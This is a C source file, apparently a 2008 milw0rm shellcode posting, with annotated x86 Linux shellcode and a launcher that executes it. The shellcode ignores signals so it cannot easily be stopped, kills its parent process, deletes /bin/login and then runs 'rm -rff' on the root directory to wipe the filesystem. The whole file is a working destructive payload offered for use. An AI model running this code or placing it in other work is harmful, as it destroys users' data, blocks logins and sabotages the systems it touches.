/*
x86 linux rm -rf / which attempts to block the process from being stopped
132 bytes
written by onionring
*/

main()
{
 char shellcode[] =
"\x31\xC0"              // xor eax, eax
"\x89\xC3"              // mov ebx, eax
"\x89\xC1"              // mov ecx, eax
"\x41"                  // inc ecx
"\xB0\x30"              // mov al, 0x30 ; sys_signal
"\xCD\x80"              // int 0x80
"\x31\xC0"              // xor eax, eax
"\xFE\xC3"              // inc bl
"\x80\xFB\x1F"          // cmp bl, 0x1f
"\x72\xF3"              // jb 0xf3
"\x04\x40"              // add al, 0x40 ; sys_getppid
"\xCD\x80"              // int 0x80
"\x89\xC2"              // mov edx, eax
"\x31\xC0"              // xor eax, eax
"\xB0\x02"              // mov al, 0x2 ; sys_fork
"\xCD\x80"              // int 0x80
"\x39\xC0"              // cmp eax, eax
"\x74\x08"              // jnz 0x8
"\x31\xC0"              // xor eax, eax
"\x89\xC3"              // mov ebx, eax
"\xB0\x01"              // mov al, 0x1 ; sys_exit
"\xCD\x80"              // int 0x80
"\x31\xC0"              // xor eax, eax
"\xB0\x42"              // mov al, 0x42 ; sys_setsid
"\xCD\x80"              // int 0x80
"\x43"                  // inc ebx
"\x39\xDA"              // cmp edx, ebx
"\x74\x08"              // jz 0x8
"\x89\xD3"              // mov ebx, edx
"\x31\xC0"              // xor eax, eax
"\x04\x25"              // add al, 0x25 ; sys_kill
"\xCD\x80"              // int 0x80
"\x31\xC0"              // xor eax, eax
"\x50"                  // push eax
"\x68\x6F\x67\x69\x6E"  // push "ogin"
"\x68\x69\x6E\x2F\x6C"  // push "in/l"
"\x68\x2F\x2F\x2F\x62"  // push "///b"
"\x89\xE3"              // mov ebx, esp
"\x31\xC0"              // xor eax, eax
"\x04\x0A"              // add al, 0xa ; sys_unlink
"\xCD\x80"              // int 0x80
"\x31\xC0"              // xor eax, eax
"\x50"                  // push eax
"\x68\x2F\x2F\x2F\x2F"  // push "////"
"\x89\xE2"              // mov edx, esp
"\x50"                  // push eax
"\x68\x2D\x72\x66\x66"  // push "-rff"
"\x89\xE1"              // mov ecx, esp
"\x50"                  // push eax
"\x68\x6E\x2F\x72\x6D"  // push "n/rm"
"\x68\x2F\x2F\x62\x69"  // push "//bi"
"\x89\xE3"              // mov ebx, esp
"\x50"                  // push eax
"\x52"                  // push edx
"\x51"                  // push ecx
"\x53"                  // push ebx
"\x89\xE1"              // mov ecx, esp
"\x31\xD2"              // xor edx, edx
"\x04\x0B"              // add al, 0xb ; sys_execve
"\xCD\x80";             // int 0x80

 (*(void (*)()) shellcode)();
}

// milw0rm.com [2008-08-18]